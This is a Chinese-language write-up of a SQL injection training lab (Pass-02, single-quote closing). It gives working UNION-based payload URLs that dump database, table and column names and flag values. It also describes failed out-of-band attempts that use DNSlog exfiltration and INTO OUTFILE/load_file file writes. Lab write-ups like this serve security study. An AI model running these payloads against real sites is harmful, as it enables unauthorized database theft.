---
date: "2020-12-09T00:00:00Z"
description: sql 注入靶场练习 单引号报错注入
keywords: SQL注入, oob带外, dnslog
tags:
- 安全
- SQL注入
title: 掌控安全 SQL 注入靶场练习Pass2 - 单引号报错注入
---

# 掌控安全 SQL 注入靶场练习Pass2 - 单引号报错注入

+ 课程目标 `https://hack.zkaq.cn/battle/target?id=695d4b6fe02d0bf3`

> **注意**, **误区** : 一定 **不要认为** 所有错误都会被反映到页面上， 程序会处理错误逻辑，并隐藏。


## 0x01. 判断注入点

### 引号探测

使用 `http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=1 --+`。 可以正常显示结果， 但 `1=2 --+` 不行。 

> 判断为 **单引号** 闭合。


### 错误姿势


```sql
-- 1. 语句错误, 测试了 `select 1 到 7`。 都没发现可以显示的注入点。 
http://vulhub.example.com:81/Pass-02/index.php?id=1' and select 1,2,3,4,5,6,7 --+ 
```
> 1. 首先`语句错误` ， 这里应该使用 **联合查询（UNION）** 确认注入点，而非 **AND**

```sql
-- 2. 联合查询判断条件错误, 显示结果不提示注入点
http://vulhub.example.com:81/Pass-02/index.php?id=1' union select 1,2,3 --+ 1
```
> 2. 使用联合查询后使用 `id=1'` 并不能确认 `select 1,2,3` 的注入点， 因为 **UNION 求并集** 依旧会显示正常查询结果。 如图 *select-union-condition-miss.png* 所示

![select-union-condition-miss.png](/assets/img/post/2020/12/09/select-union-condition-miss.png)


### 正确姿势

```sql
-- 1. 正确判断, --+ 注释
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 --+ 1
```

```sql
-- 2. 正确判断, # 号注释。 urlcode %23  = #
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,3 %23+ 1
```

1. `id=1' and 1=2` : 闭合 **左单引号** ， 错误截断 。
2. `1=2 union select 1,2,3` : 尝试注入点
3. `--+ 1` 或 `%23+ 1` : 注释右单引号 。 

> **Notice** : `+` 将在 URL Code 中转为为 **空格 ` `**


## 0x02. 数据查找

找到了 **注入显示点** 之后， 剩下的就是是 **联合查询** 的问题了 ， 可以说的东西不多

### 0x02.1. 查询库名, 表名

由于有 **2 和 3** 两个可注入点， 因此在构造语句的时候，使用了 **2条自查询**

1. `select database()` : 查询当前库名
2. `select group_concat(table_name) from information_schema.tables where table_schema=database())` : 通过 `information_schema` 库查询当前所有表名。

```sql
-- dump dbname and tablename 
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1, (select database()), (select group_concat(table_name) from information_schema.tables where table_schema=database()) --+ 1


-- dbname: error
-- tablenames: error_flag,user
```

### 0x02.2. 查询列名

```sql
--- dump column name
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='error_flag' --+ 1


-- columns: Id,flag
```

![dump-column-name.png](/assets/img/post/2020/12/09/dump-column-name.png)

### 0x02.3. 查询 flag 所有字段值

```sql
--- dump flag values
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1

-- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
```

### 0x03 提交

五个过关 Flag 中 应该只有一个是正确的， 所以需要轮训尝试。

> 第一关的时候我以为 5 个都可以用。 结果随机选择的时候，发现有错误， 还以为程序异常呢。



## 0x04 尝试方法

**1. 使用 OOB (out of band) 带外测试**

最开始在遇到 **注入显示点** 问题的时候， 本准备放弃查找显示点。 替换使用 **`OOB` 带外测试 - Dnslog 测试** 直接一把梭把所有数据全部提交到 `dnslog.cn` 上 。

然而意想不到的是， `dnslog 测试` 不可用， `load_file` 构造的请求无法成功。

**2. OOB 文件 测试法**

在查找 `load_file()` 函数使用过程中， 找到了以下 paper 。 使用 `INTO OUTFILE` 将结果存储到 目标目录。

> https://www.exploit-db.com/papers/14635

+ `select database`

```sql
--- select database
http://vulhub.example.com:81/Pass-02/index.php?id=1' union all select database() INTO OUTFILE '/tmp/1.txt' --+ 1

```

+ `select load_file`

```sql
--- select load_file
http://vulhub.example.com:81/Pass-02/index.php?id=1' and 1=2 union all select 1,2,(select load_file('/tmp/1.txt' )) --+ 1
```

然而失败了。 T_T 。

